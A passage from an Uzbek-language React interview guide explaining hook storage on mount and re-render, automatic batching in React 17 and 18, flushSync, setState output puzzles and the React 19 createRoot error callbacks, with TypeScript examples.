  const [count, setCount] = useState(0);  // Initial: mountState; Re-render: updateState
  console.log("render");

  useEffect(() => {
    console.log("effect");
    return () => console.log("cleanup");
  }, [count]);

  return (
    <button onClick={() => setCount(count + 1)}>
      {count}
    </button>
  );
}

// Initial render:
// 1. "render"
// 2. (DOM yaratiladi, button mount)
// 3. "effect"

// Click → setCount(1):
// 1. "render"  (re-render)
// 2. (DOM update — button.firstChild.nodeValue = "1")
// 3. "cleanup" (eski effect cleanup)
// 4. "effect"  (yangi effect)
```

**Hooks identity invariant:**

```tsx
function BadComp({ show }: { show: boolean }) {
  if (show) {
    const [name, setName] = useState("Ali");  // ❌ Conditional hook
  }
  const [count, setCount] = useState(0);  // ← index 0 yoki 1 — bug

  return <div>{count}</div>;
}

// Mount: show=true:
// hooks[0] = name state
// hooks[1] = count state

// Re-render: show=false:
// hooks[0] = count state ← INDEX MISMATCH
// React: "Rendered fewer hooks than expected"
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Mount path vs Update path:**

```typescript
// React internal (sodda)
let HooksDispatcher;

function renderWithHooks(fiber, Component, props) {
  if (fiber.alternate === null) {
    // Initial render
    HooksDispatcher = HooksDispatcherOnMount;
  } else {
    // Re-render
    HooksDispatcher = HooksDispatcherOnUpdate;
  }

  const children = Component(props);
  return children;
}

const HooksDispatcherOnMount = {
  useState: mountState,    // creates new hook object
  useEffect: mountEffect,  // creates new hook + adds to effect list
  // ...
};

const HooksDispatcherOnUpdate = {
  useState: updateState,    // reads existing hook, applies queue
  useEffect: updateEffect,  // reads existing hook, compares deps
  // ...
};
```

**`mountState` (initial):**

```typescript
function mountState(initialState) {
  const hook = mountWorkInProgressHook();  // creates new linked list node
  hook.memoizedState = typeof initialState === "function"
    ? initialState()
    : initialState;
  hook.queue = { ... };

  const dispatch = dispatchSetState.bind(null, currentFiber, hook.queue);
  return [hook.memoizedState, dispatch];
}
```

**`updateState` (re-render):**

```typescript
function updateState(initialState) {
  const hook = updateWorkInProgressHook();  // reads next hook from list
  let newState = hook.memoizedState;

  // Apply pending updates
  if (hook.queue.pending) {
    newState = applyUpdates(hook.queue.pending, hook.memoizedState);
  }

  hook.memoizedState = newState;
  return [newState, hook.queue.dispatch];
}
```

**Hook linked list (per fiber):**

```
fiber.memoizedState
       ↓
[useState hook] → [useEffect hook] → [useState hook] → null
   {state}          {deps, fn}        {state}
```

Index 0, 1, 2 — call order'iga mos. Conditional hooks bu invariantni buzadi → React error.

**Reconciliation farqi:**

Initial render — `reconcileChildren`'da `current === null` — har element uchun yangi fiber yaratiladi (`Placement` flag).

Re-render — `current` mavjud — har element uchun:
1. Type match — update path (props/state diff)
2. Type mismatch — old fiber unmount + new fiber create
3. Key match (lists) — fiber position retain qilingan

**`alternate` swap:**

```typescript
// Initial mount
fiberRoot = {
  current: null,
  workInProgress: <NewFiberTree>,
};
// Commit:
fiberRoot.current = workInProgress;
fiberRoot.workInProgress = null;

// Re-render
fiberRoot = {
  current: <ExistingTree>,
  workInProgress: cloneOf(current),  // alternate tree
};
// Commit:
fiberRoot.current = workInProgress;
// Old tree → workInProgress (alternate swap, no GC)
```

Memory efficient — ikki tree bir-birini "alternate" qiladi.

**Mount-only optimization:**

Initial render React optimization'lar:
- Hidden classes alloc (V8) — har Fiber bir xil shape
- Pre-allocated arrays for children
- DOM batch insertion — ko'p element birga `appendChild` (DocumentFragment)

</details>

### Edge Cases

- **Hook call order**: Conditional hook chaqiruvi — re-render'da index mismatch. Yechim: top-level hook chaqiruv, conditional logic hook ichida.
- **Initial state lazy initializer**: `useState(() => expensive())` — initializer **faqat mount'da** chaqiriladi. Re-render'da skip. StrictMode'da 2x mount.
- **`React.memo` initial render bypass qilmaydi**: Mount doim qilinadi (komponent yangi), faqat re-render'da shallow check.

### Follow-up savollar

- "Re-render'da DOM doim update qilinadi-mi?" — Yo'q. Reconciler diff qilib, faqat o'zgargan property/text uchun mutation qiladi. Bailout (props bir xil) bo'lsa — DOM tegmaydi.
- "Hook'lar qaerda saqlanadi?" — Fiber'ning `memoizedState` linked list'ida (har hook bitta node). Per-component, per-instance.
- "Initial render performance Re-render'dan farqli-mi?" — Ha. Initial doim sekinroq (DOM yaratish). Re-render — diff + faqat o'zgarganlar (tezroq). Memoization (memo, useMemo) re-render'larda ish beradi.

</details>

---

### 22. Batching nima va R17 vs R18+ farqi [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**Batching** — bir nechta `setState` chaqiruvlarini bitta re-render'ga birlashtirish. **R17 va undan oldin**: faqat React event handler ichida (e.g., `onClick`) batched. setTimeout, Promise, native event listener — har `setState` alohida re-render. **R18+ Automatic Batching**: barcha kontekstlarda batched (setTimeout, Promise, async/await, native listener).

### To'liq tushuntirish

**R17 (legacy batching):**

```tsx
function Component() {
  const [count, setCount] = useState(0);
  const [name, setName] = useState("");

  // ✅ React handler — batched (R17 va R18 bir xil)
  const handleClick = () => {
    setCount(1);
    setName("Ali");
    // → 1 re-render
  };

  // ❌ R17: setTimeout — NOT batched
  const handleAsync = () => {
    setTimeout(() => {
      setCount(2);  // re-render 1
      setName("Vali");  // re-render 2
      // → 2 re-render (R17)
    }, 0);
  };

  // ❌ R17: Promise — NOT batched
  const handlePromise = async () => {
    await fetchData();
    setCount(3);  // re-render 1
    setName("Soli");  // re-render 2
    // → 2 re-render (R17)
  };
}
```

**R18+ (automatic batching):**

```tsx
// ✅ R18: setTimeout — batched
const handleAsync = () => {
  setTimeout(() => {
    setCount(2);
    setName("Vali");
    // → 1 re-render (R18+)
  }, 0);
};

// ✅ R18: Promise — batched
const handlePromise = async () => {
  await fetchData();
  setCount(3);
  setName("Soli");
  // → 1 re-render (R18+)
};

// ✅ R18: native event — batched
useEffect(() => {
  const handler = () => {
    setCount(4);
    setName("Eli");
    // → 1 re-render (R18+)
  };
  document.addEventListener("scroll", handler);
  return () => document.removeEventListener("scroll", handler);
}, []);
```

### Kod misoli

```tsx
import { useState } from "react";

function BatchingDemo() {
  const [count, setCount] = useState(0);
  console.log("render", count);

  return (
    <div>
      <button
        onClick={() => {
          setTimeout(() => {
            setCount((c) => c + 1);
            setCount((c) => c + 1);
            setCount((c) => c + 1);
          }, 0);
        }}
      >
        +3
      </button>
    </div>
  );
}

// R17 output (3 re-render):
// render 0  (initial)
// (click)
// render 1
// render 2
// render 3

// R18 output (1 re-render):
// render 0  (initial)
// (click)
// render 3
```

<details>
<summary><strong>Deep Dive</strong></summary>

**R17 batching mexanizmi:**

```typescript
// React handler ichida `batchedUpdates` flag yoqilgan
function dispatchEvent(event) {
  batchedUpdates(() => {
    handleEvent(event);  // setState'lar shu ichida batched
  });
}

function batchedUpdates(fn) {
  isBatching = true;
  try {
    fn();
  } finally {
    isBatching = false;
    flushSyncUpdates();  // Pending update'larni qo'llash
  }
}

// setState ichida:
function setState(value) {
  enqueueUpdate(value);
  if (!isBatching) {
    scheduleSyncRender();  // ← har setState alohida render (R17 setTimeout/Promise'da)
  }
  // isBatching true bo'lsa — pending'da qoladi (R17 React handler)
}
```

R17'da `setTimeout(() => setState(x))` — `isBatching=false`, har setState darhol render trigger.

**R18 automatic batching:**

```typescript
// R18+: barcha setState'lar default batched (Lane'lar orqali)
function setState(value) {
  enqueueUpdate(value);
  scheduleUpdate();  // ← Lane'ga qo'shadi, microtask'da flush
}

function scheduleUpdate() {
  // Microtask queue'ga qo'shadi
  if (!hasScheduledUpdate) {
    hasScheduledUpdate = true;
    queueMicrotask(performWork);
  }
}

function performWork() {
  // Joriy microtask'da barcha pending update'lar bir cycle'da
  hasScheduledUpdate = false;
  renderRootSync(rootWithPendingUpdates);
}
```

`queueMicrotask` setTimeout/Promise/event listener'dan keyin avtomatik chaqiriladi — barcha `setState`'lar bir microtask'da batched.

**`flushSync` — opt-out:**

R18'da batching'ni majburan to'xtatish uchun:

```tsx
import { flushSync } from "react-dom";

function handleClick() {
  flushSync(() => {
    setCount(1);
    // → darhol re-render (paint mumkin)
  });
  flushSync(() => {
    setName("Ali");
    // → darhol re-render
  });
  // → 2 re-render (batching o'chirilgan)
}
```

Use case: ikki state'ni alohida visual step'larda ko'rsatish (animation), DOM measurement'dan oldin force update.

**Concurrent rendering bilan batching:**

R18 lanes model'da batching `queueMicrotask` o'rniga **lane-based scheduling**:
- Bir xil priority'dagi update'lar bir lane'ga jamlanadi
- Lane render'da bir cycle bilan ishlanadi
- Different priority — alohida lanes (high pri sync, low pri later)

**Migration impact (R17 → R18):**

```tsx
// R17: 2 re-render — visual step
function handle() {
  setLoading(true);
  setTimeout(() => {
    fetchData().then((data) => {
      setData(data);      // re-render 1
      setLoading(false);  // re-render 2 — loading false ko'rinmaydi
    });
  }, 0);
}

// R18: 1 re-render — atomic
function handle() {
  setLoading(true);
  setTimeout(() => {
    fetchData().then((data) => {
      setData(data);
      setLoading(false);
      // → 1 re-render bilan — loading transition yo'q
    });
  }, 0);
}
// Issue: loading false darhol bo'ldi visual'da
// Fix: setLoading(false) avval — keyin awaiting setData
```

**Edge case — multiple roots:**

`createRoot` bilan ko'p root'lar — har biri o'z batching scope'iga ega. Cross-root setState batched bo'lmasligi mumkin (R18 fix).

</details>

### Edge Cases

- **`flushSync` qachon kerak**: Animation step (`flushSync(() => setX(1))`, `flushSync(() => setX(2))`), DOM measurement (force layout), legacy code migration (R17 behavior'ni saqlash).
- **`useState` + `setState` ketma-ket**: Functional update kerak agar oldingi value'ga bog'liq bo'lsa (`setX(prev => prev + 1)`). Object value bilan `setX({...x, y: 2})` — closure'dagi `x` eski bo'lishi mumkin.
- **3rd-party library**: Eski library'lar `setState` qaytaradigan re-render kutadi — R18'da batching break qilishi mumkin.

### Follow-up savollar

- "Batching `useReducer`'da ham ishlaydi-mi?" — Ha, bir xil mexanizm. `dispatch` chaqiruvlari bir lane'ga jamlanadi.
- "Lane'lar batching bilan qanday bog'liq?" — Lane = priority. Bir xil lane update'lar batched, har xil lane'lar (high vs low pri) alohida cycle'larda render.
- "Class komponentlarda ham batching ishlaydi-mi?" — Ha. `this.setState` ham bir xil scheduler'dan o'tadi.

</details>

---

### 23. `flushSync` qachon ishlatiladi va nima uchun ehtiyot bo'lish kerak? [Senior]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**`flushSync(callback)`** — `react-dom` API. Callback ichidagi state update'larni **darhol sync render qiladi** — automatic batching va concurrent scheduling'ni bypass. Use case: animation step'lar, DOM measurement, 3rd-party DOM library bilan integration. Ehtiyotlik: **performance penalty** — har chaqiruv full render+commit cycle, paint trigger.

### To'liq tushuntirish

**Use case'lar:**

1. **Visual step animation** — ikki state'ni alohida frame'larda ko'rsatish
2. **DOM measurement** — yangi DOM holatini darhol o'lchash kerak
3. **Legacy 3rd-party integration** — DOM mutation kutayotgan library
4. **Print preview** — `window.print()` chaqiruvidan oldin DOM ready bo'lishi shart

**Anti-use case'lar:**
- Performance optimization (yo'q, sekinroq qiladi)
- Race condition fix (yechim emas)
- Standard event handler (kerak emas)

### Kod misoli

```tsx
import { flushSync } from "react-dom";

// 1. Animation step
function ProgressBar() {
  const [progress, setProgress] = useState(0);

  const animate = () => {
    flushSync(() => setProgress(50));
    // → re-render + paint (50% ko'rinadi)

    setTimeout(() => {
      flushSync(() => setProgress(100));
      // → re-render + paint (100% ko'rinadi)
    }, 500);
  };

  return (
    <div>
      <div style={{ width: `${progress}%`, transition: "width 0.5s" }} />
      <button onClick={animate}>Start</button>
    </div>
  );
}

// 2. DOM measurement
function ScrollToBottom() {
  const containerRef = useRef<HTMLDivElement>(null);
  const [messages, setMessages] = useState<string[]>([]);

  const addMessage = (msg: string) => {
    flushSync(() => {
      setMessages((prev) => [...prev, msg]);
    });
    // → DOM yangilangan, scrollHeight to'g'ri qiymat
    if (containerRef.current) {
      containerRef.current.scrollTop = containerRef.current.scrollHeight;
    }
  };

  return (
    <div ref={containerRef} style={{ overflow: "auto", height: 400 }}>
      {messages.map((m, i) => (
        <div key={i}>{m}</div>
      ))}
    </div>
  );
}

// 3. Print preview
function PrintInvoice({ invoice }: { invoice: Invoice }) {
  const [printing, setPrinting] = useState(false);

  const handlePrint = () => {
    flushSync(() => setPrinting(true));
    // ✅ DOM yangilangan — print stylesheet aktiv
    window.print();
    setPrinting(false);  // batching OK — print tugagan
  };

  return (
    <>
      <button onClick={handlePrint}>Print</button>
      {printing && <PrintLayout invoice={invoice} />}
    </>
  );
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**`flushSync` internal:**

```typescript
function flushSync<R>(fn: () => R): R {
  // 1. Batching/scheduling holatini saqlash
  const prevExecutionContext = executionContext;
  executionContext |= BatchedContext;

  try {
    // 2. Callback chaqiriladi (setState'lar enqueue qilinadi)
    return fn();
  } finally {
    // 3. Pending sync work'ni majburan flush
    executionContext = prevExecutionContext;
    flushSyncCallbacks();  // ← darhol render+commit
  }
}
```

`flushSyncCallbacks` — joriy lanes'dagi sync work'ni darhol bajaradi (Scheduler bypass).

**Performance penalty:**

```tsx
// ❌ Anti-pattern: loop ichida flushSync
items.forEach((item) => {
  flushSync(() => {
    setProcessedCount((c) => c + 1);  // ← har gal full render
  });
});
// 1000 item — 1000 ta render+commit cycle, page freeze

// ✅ To'g'ri: bitta state update
setProcessedCount(items.length);  // ← 1 ta render
```

**Concurrent rendering bilan interaction:**

```tsx
// flushSync — concurrent feature'larni bypass qiladi
flushSync(() => {
  setUserProfile(newProfile);  // sync render
});

// Vs startTransition — non-urgent (concurrent)
startTransition(() => {
  setSearchResults(results);  // low priority, interruptible
});
```

`flushSync` — sync, urgent, blocking. `startTransition` — non-urgent, interruptible.

**`flushSync` event handler ichida:**

```tsx
function handleClick() {
  flushSync(() => {
    setCount(1);
  });
  // ← DOM yangilangan, browser paint imkoniyati

  flushSync(() => {
    setName("Ali");
  });
  // ← Yana DOM yangilangan
}
// Total: 2 ta render+paint cycle (visual flicker mumkin)

// Vs default batching (1 ta render):
function handleClick() {
  setCount(1);
  setName("Ali");
  // → 1 ta render+paint
}
```

**`flushSync` `useEffect` ichida:**

```tsx
useEffect(() => {
  flushSync(() => {
    setData(fetchedData);
  });
  // ← Sync render. Ammo `useEffect` allaqachon paint'dan keyin chaqiriladi —
  // bu pattern odatda kerak emas. Faqat 3rd-party DOM API integration uchun.
}, [fetchedData]);
```

**`flushSync` warning'lar (R18+):**

- Render phase ichida — error: "flushSync was called from inside a lifecycle method"
- Effect phase'da OK
- Event handler'da OK

**Tutaroq alternativalar:**

1. **`useLayoutEffect`** — sync DOM measurement, flushSync'siz
2. **Refs** — DOM holatini saqlash, re-render'siz
3. **CSS transitions** — animation uchun (state o'zgarganda CSS handle qiladi)

```tsx
// ❌ flushSync animation
const animate = () => {
  flushSync(() => setProgress(50));
  setTimeout(() => flushSync(() => setProgress(100)), 500);
};

// ✅ CSS transition
<div style={{ width: `${progress}%`, transition: "width 0.5s" }} />
const animate = () => {
  setProgress(50);
  setTimeout(() => setProgress(100), 500);
};
```

</details>

### Edge Cases

- **`flushSync` ichida throw**: Pending update'lar baribir flushed (try-finally). Lekin error propagate qiladi.
- **Nested `flushSync`**: Inner sync — bir vaqtda ishlaydi. Outer commit faqat inner tugagandan keyin.
- **`flushSync` server-side**: `react-dom/server`'da yo'q (no-op). SSR'da concurrent yo'q, hammasi sync.
- **React 19 ref callback cleanup**: Ref attach/detach — batching ichida default, lekin `flushSync` bilan immediate.

### Follow-up savollar

- "`flushSync` performance overhead?" — Har chaqiruv full render+commit cycle bo'ladi (yield, batching bypass). Loop ichida ko'p chaqirilsa katta penalty. DevTools Profiler bilan o'lchash.
- "`startTransition` `flushSync`'ga qarama-qarshi-mi?" — Ha. `flushSync` — sync urgent. `startTransition` — async non-urgent. Boshqa-boshqa concurrent cycle qatlamlari.
- "Class component'da `forceUpdate` `flushSync`'ga teng-mi?" — `forceUpdate` re-render trigger qiladi, lekin batching/concurrency ichida ishlaydi. `flushSync(() => this.forceUpdate())` to'g'ri analog.

</details>

---

### 24. Output: ketma-ket `setState` chaqiruvlari [Output] [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Savol

Quyidagi React 18 komponentidagi `console.log` chaqiruvlari va `count` qiymati nima bo'ladi click'dan keyin?

```tsx
function Counter() {
  const [count, setCount] = useState(0);
  console.log("render:", count);

  const handleClick = () => {
    setCount(count + 1);
    setCount(count + 1);
    setCount(count + 1);
  };

  return <button onClick={handleClick}>{count}</button>;
}

// Initial render → click bir marta
```

### Javob

```
render: 0
(click sodir bo'ldi)
render: 1
```

**Tushuntirish:**

`count` initial 0. `handleClick` ichida 3 marta `setCount(count + 1)` chaqiriladi. **Closure** — har 3 chaqiruv `count = 0` (handler render'dan kelgan):
- `setCount(0 + 1)` = `setCount(1)`
- `setCount(0 + 1)` = `setCount(1)`
- `setCount(0 + 1)` = `setCount(1)`

Batching: 3 ta update bitta render'ga jamlanadi, oxirgi qiymat `1`. Render: `count = 1`.

**Functional update bilan to'g'ri:**

```tsx
const handleClick = () => {
  setCount((c) => c + 1);  // 0 → 1
  setCount((c) => c + 1);  // 1 → 2
  setCount((c) => c + 1);  // 2 → 3
};
// Render: render: 3
```

Functional update — eski state'ni queue order'ida oladi (closure'dan emas).

<details>
<summary><strong>Deep Dive</strong></summary>

**Batching internals:**

```typescript
// React internal — update queue per hook
hook.queue.pending = circularLinkedList;

// dispatchSetState
function dispatchSetState(fiber, queue, action) {
  const update = { action, next: null };
  enqueueUpdate(queue, update);  // ← linked list'ga qo'shadi
  scheduleUpdateOnFiber(fiber);
}

// Render time:
function updateState() {
  const hook = currentHook;
  let newState = hook.memoizedState;

  if (hook.queue.pending) {
    let update = hook.queue.pending.next;
    do {
      const action = update.action;
      newState = typeof action === "function"
        ? action(newState)  // ← functional: prev value passed
        : action;            // ← direct value: closure value
      update = update.next;
    } while (update !== hook.queue.pending.next);
  }

  hook.memoizedState = newState;
  return [newState, dispatch];
}
```

**Closure trap:**

```tsx
const handleClick = () => {
  // count = 0 (render closure)
  setCount(count + 1);  // setCount(1)
  setCount(count + 1);  // setCount(1) — count hali 0
  setCount(count + 1);  // setCount(1) — count hali 0
};
```

`handleClick` — render time'da yaratilgan closure. `count` shu render'dagi value (`0`). React `setCount(value)` chaqiruvida value'ni queue'ga qo'shadi. Render time'da queue'dan oxirgi value olinadi.

**Functional update — queue traversal:**

```tsx
const handleClick = () => {
  setCount((c) => c + 1);  // queue: [(c) => c+1]
  setCount((c) => c + 1);  // queue: [(c) => c+1, (c) => c+1]
  setCount((c) => c + 1);  // queue: [(c) => c+1, (c) => c+1, (c) => c+1]
};

// Render time queue traversal:
// state = 0
// state = (c => c + 1)(0) = 1
// state = (c => c + 1)(1) = 2
// state = (c => c + 1)(2) = 3
// memoizedState = 3
```

**Mixed direct + functional:**

```tsx
const handleClick = () => {
  setCount(10);            // direct: state = 10
  setCount((c) => c + 1);  // functional: state = 11
  setCount(20);            // direct: state = 20
  setCount((c) => c + 5);  // functional: state = 25
};
// Render: count = 25
```

**Bailout (same value):**

```tsx
const handleClick = () => {
  setCount(0);  // count allaqachon 0 — Object.is bailout, render skip
};
// Hech qanday render
```

**StrictMode 2x render — output (dev only):**

```
render: 0
render: 0  (StrictMode 2x — render function dev'da 2 marta chaqiriladi)
(click)
render: 1
render: 1  (StrictMode 2x — har update'da ham render dev'da 2 marta)
```

R18 dev StrictMode: mount/update'da render function 2x chaqiriladi; useEffect'da mount-cleanup-mount cycle.

</details>

### Edge Cases

- **`setCount(count + 1)` — stale closure**: Yuqorida ko'rsatilgan klassik trap.
- **`setCount(state)` — same value**: `Object.is(prevState, state)` — bailout, re-render bo'lmaydi.
- **Object state**: `setUser({...user, name: "Ali"})` — yangi reference, doim re-render (object identity).

### Follow-up savollar

- "Functional update doim ishlatish kerakmi?" — Faqat oldingi state'ga bog'liq bo'lganda. Independent state — direct OK.
- "Class component'da `this.setState({count: this.state.count + 1})` ham xato beradi-mi?" — Ha, bir xil. `this.setState((state) => ({count: state.count + 1}))` — to'g'ri.
- "Reducer (`useReducer`)'da bu muammo bormi?" — Yo'q. `dispatch(action)` doim reducer chaqiradi state argument bilan — closure trap yo'q.

</details>

---

### 25. Output: setTimeout ichida setState — R17 vs R18 [Output] [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Savol

Quyidagi kod **React 17** va **React 18** versiyalarida nechta `console.log("render")` chiqaradi click'dan keyin?

```tsx
function Demo() {
  const [count, setCount] = useState(0);
  const [name, setName] = useState("");
  console.log("render");

  const handleClick = () => {
    setTimeout(() => {
      setCount(1);
      setName("Ali");
    }, 0);
  };

  return <button onClick={handleClick}>Click</button>;
}
```

### Javob

| Versiya | Render soni | Sabab |
|---------|-------------|-------|
| **R17** | 2 | setTimeout — automatic batching yo'q |
| **R18** | 1 | Automatic batching universal |

**R17 output:**
```
render        (initial)
(click)
render        (setCount(1) — re-render 1)
render        (setName("Ali") — re-render 2)
```

**R18 output:**
```
render        (initial)
(click)
render        (ikkisi batched — re-render 1)
```

<details>
<summary><strong>Deep Dive</strong></summary>

**R17 batching scope:**

```typescript
// R17 mexanizmi
function dispatchEvent(event) {
  unstable_batchedUpdates(() => {
    eventHandler(event);  // setState'lar batched ICHIDA
  });
  // setTimeout callback — TASHQARIDA
}

// setTimeout callback — yangi task, batching scope yo'q
setTimeout(() => {
  setCount(1);  // isBatching=false — darhol render
  setName("Ali");  // isBatching=false — darhol render
}, 0);
```

**R18 batching scope (lanes):**

```typescript
// R18 mexanizmi
function setState(value) {
  enqueueUpdate(value);
  scheduleUpdateOnFiber(fiber, lane);
  // ← Lane'ga qo'shadi
}

// Bir microtask ichida ko'p setState — bir lane → bir render
queueMicrotask(performSyncWorkOnRoot);  // Bir martai chaqiriladi
```

**`flushSync` bilan R18'da R17 behavior:**

```tsx
const handleClick = () => {
  setTimeout(() => {
    flushSync(() => setCount(1));    // re-render 1
    flushSync(() => setName("Ali")); // re-render 2
  }, 0);
};
// R18: 2 re-render (R17 behavior'ni emulate)
```

**Promise/async-da:**

```tsx
const handleClick = async () => {
  await fetch("/api");
  setCount(1);     // R17: render 1, R18: queued
  setName("Ali");  // R17: render 2, R18: same render
};

// R17: 2 re-render
// R18: 1 re-render
```

**Native event listener:**

```tsx
useEffect(() => {
  const handler = () => {
    setCount(1);     // R17: render 1, R18: queued
    setName("Ali");  // R17: render 2, R18: same render
  };
  document.addEventListener("scroll", handler);
  return () => document.removeEventListener("scroll", handler);
}, []);
```

**ReactDOM.render vs createRoot impact:**

- `ReactDOM.render` (R17 API) — automatic batching yo'q, faqat React handler ichida
- `createRoot` (R18 API) — automatic batching yoqilgan
- Bir xil React 18 versiya'da: agar `ReactDOM.render` ishlatilsa — legacy mode, R17 batching behavior

**Production impact:**

R18'ga upgrade — eski code break qilishi mumkin:
```tsx
// R17: 2 re-render — loading transition ko'rinadi
setLoading(true);
fetchData().then((data) => {
  setData(data);
  setLoading(false);
});

// R18: 1 re-render — loading flicker yo'q
// ⚠️ Lekin: bazi UX vector loading transition kutadi (visual feedback)
```

</details>

### Edge Cases

- **Mixed sync/async**: `setCount(1); setTimeout(() => setName("Ali"), 0)` — sync setCount immediate, async setName alohida.
- **R18 + flushSync**: `flushSync` har gal alohida render — batching break.
- **Strict Mode + setTimeout**: `setTimeout` callback dev'da 1x (effect emas) — render 1x batched.

### Follow-up savollar

- "Native event listener nima uchun R17'da batching'siz edi?" — React event delegation `document` (R16) yoki root (R17)'ga. Native listener bypass qilib, React'ning `dispatchEvent` wrapper'iga kirmaydi. R18 lanes mexanizmi orqali univerlsal.
- "`Promise.all` ichida ko'p setState — qanday batched?" — R18: bir tick'da ishlasa batched. R17: har one alohida.
- "WebSocket message — batched-mi?" — R18: ha (native event listener). R17: yo'q.

</details>

---

### 26. `createRoot` options — `onCaughtError`, `onUncaughtError`, `onRecoverableError` [Senior]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

R19'dan `createRoot` (va `hydrateRoot`) **error callback options**'ni qabul qiladi: `onCaughtError` (Error Boundary tutgan errorlar), `onUncaughtError` (boundary tutmagan, app crash), `onRecoverableError` (auto-recovered, asosan hydration mismatch). Production'da error tracking (Sentry, DataDog)'ga error pipe qilish uchun ishlatiladi. Eski `componentDidCatch` faqat boundary class ichida edi — bu callback'lar root-level.

### To'liq tushuntirish

**3 ta callback semantikasi:**

| Callback | Qachon chaqiriladi | Default behavior |
|----------|--------------------|-------------------|
| `onCaughtError` | Error boundary `componentDidCatch`'i error'ni tutadi | console.error |
| `onUncaughtError` | Hech qaysi boundary tutmagan | console.error + app crash |
| `onRecoverableError` | React auto-recovered (hydration mismatch, transient) | console.error |

### Kod misoli

```tsx
import { createRoot, hydrateRoot } from "react-dom/client";
import * as Sentry from "@sentry/react";

const container = document.getElementById("root")!;

const root = createRoot(container, {
  onCaughtError: (error, errorInfo) => {
    // Boundary tutdi — handled error
    console.warn("Caught error:", error);
    Sentry.captureException(error, {
      tags: { type: "caught", boundary: errorInfo.errorBoundary?.name },
      extra: { componentStack: errorInfo.componentStack },
    });
  },

  onUncaughtError: (error, errorInfo) => {
    // ⚠️ Hech kim tutmadi — kritik
    console.error("Uncaught error:", error);
    Sentry.captureException(error, {
      level: "fatal",
      tags: { type: "uncaught" },
      extra: { componentStack: errorInfo.componentStack },
    });
    // Optional: show user-facing fallback
    showCriticalErrorUI();
  },

  onRecoverableError: (error, errorInfo) => {
    // Auto-recovered — odatda hydration mismatch
    console.warn("Recoverable error:", error);
    Sentry.captureMessage(`Recoverable: ${error.message}`, "warning");
  },
});

root.render(<App />);
```

**`hydrateRoot` bilan bir xil API:**

```tsx
const root = hydrateRoot(container, <App />, {
  onCaughtError: (error, info) => Sentry.captureException(error),
  onUncaughtError: (error, info) => Sentry.captureException(error),
  onRecoverableError: (error, info) => Sentry.captureException(error),
});
```

<details>
<summary><strong>Deep Dive</strong></summary>

**`errorInfo` shape:**

```typescript
interface ErrorInfo {
  componentStack: string;       // React component tree path
  digest?: string;              // Production minified error digest
  errorBoundary?: ComponentType; // Boundary that caught (if any)
}
```

**Default behavior breakdown:**

```typescript
// React internal (sodda)
function logError(boundary, error, errorInfo) {
  if (boundary) {
    // Caught by boundary
    if (root.options.onCaughtError) {
      root.options.onCaughtError(error, errorInfo);
    } else {
      console.error("Uncaught error:", error);  // default
    }
  } else {
    // No boundary
    if (root.options.onUncaughtError) {
      root.options.onUncaughtError(error, errorInfo);
    } else {
      console.error("Uncaught error:", error);
      window.dispatchEvent(new ErrorEvent("error", { error }));
    }
  }
}

function logRecoverableError(root, error, errorInfo) {
  if (root.options.onRecoverableError) {
    root.options.onRecoverableError(error, errorInfo);
  } else {
    console.error(error);
  }
}
```

**`onRecoverableError` use case'lar:**

1. **Hydration mismatch** — server HTML va client render farqlanganda
2. **Suspense nested boundary recovery** — Promise resolve'dan keyin boundary recover
3. **Concurrent restart** — abort'dan keyin re-render success

**`onCaughtError` vs `componentDidCatch`:**

```tsx
// Boundary'da componentDidCatch
class MyBoundary extends React.Component {
  componentDidCatch(error, errorInfo) {
    // ⚠️ Eski API — boundary-specific
    Sentry.captureException(error);
  }

  render() { return this.props.children; }
}

// vs root-level onCaughtError
const root = createRoot(container, {
  onCaughtError: (error, info) => {
    // ✅ Centralized — har boundary'dagi error shu yerda
    Sentry.captureException(error);
  },
});
```

R19 — `onCaughtError` afzal (centralized, no per-boundary code).

**Sentry React integration (R19+):**

```tsx
import * as Sentry from "@sentry/react";

Sentry.init({ dsn: "..." });

const root = createRoot(container, {
  onUncaughtError: Sentry.reactErrorHandler({
    showDialog: true,  // user feedback dialog
  }),
  onCaughtError: Sentry.reactErrorHandler(),
  onRecoverableError: Sentry.reactErrorHandler(),
});
```

**SSR + hydration error handling:**

```tsx
// Hydration mismatch flow:
// 1. Server HTML: <p>Hello, World</p>
// 2. Client render: <p>Hello, User</p>
// 3. React detects mismatch
// 4. onRecoverableError: "Hydration mismatch"
// 5. React re-renders entire tree client-side (recovery)

const root = hydrateRoot(container, <App />, {
  onRecoverableError: (error) => {
    if (error.message.includes("Hydration")) {
      // Custom hydration error tracking
      analytics.track("hydration_mismatch", {
        path: window.location.pathname,
        message: error.message,
      });
    }
  },
});
```

**Production minified error digest:**

```tsx
// errorInfo.digest — production-only short hash
const root = createRoot(container, {
  onUncaughtError: (error, errorInfo) => {
    fetch("/api/errors", {
      method: "POST",
      body: JSON.stringify({
        digest: errorInfo.digest,        // server'ga decode uchun
        message: error.message,
        stack: error.stack,
        componentStack: errorInfo.componentStack,
      }),
    });
  },
});
```

`digest` — minified production'da error message dropped, faqat hash. Server'da source maps bilan decode.

**`onError` callback'larning chaqiruv tartibi:**

```typescript
// Error throw bo'lganda:
// 1. Error boundary tries to catch (componentDidCatch + getDerivedStateFromError)
// 2a. Caught → onCaughtError (root option)
// 2b. Not caught → onUncaughtError (root option)
// 3. Recoverable cases → onRecoverableError (separate flow)
```

**Class boundary + root callbacks coexistence:**

```tsx
class Boundary extends React.Component {
  componentDidCatch(error, info) {
    console.log("Boundary caught:", error);
    // Local handling
  }

  render() {
    return this.props.children;
  }
}

// Root
const root = createRoot(container, {
  onCaughtError: (error, info) => {
    // Boundary 'catches' first, then onCaughtError
    console.log("Root onCaughtError:", error);
  },
});

// Order:
// 1. componentDidCatch (boundary-specific)
// 2. onCaughtError (root-level, centralized logging)
```

**`react-error-boundary` library + R19 callbacks:**

```tsx
import { ErrorBoundary } from "react-error-boundary";

function App() {
  return (
    <ErrorBoundary fallback={<ErrorView />}>
      <Content />
    </ErrorBoundary>
  );
}

// `react-error-boundary` ham `componentDidCatch` ishlatadi — onCaughtError shu yerda chaqiriladi
```

</details>

### Edge Cases

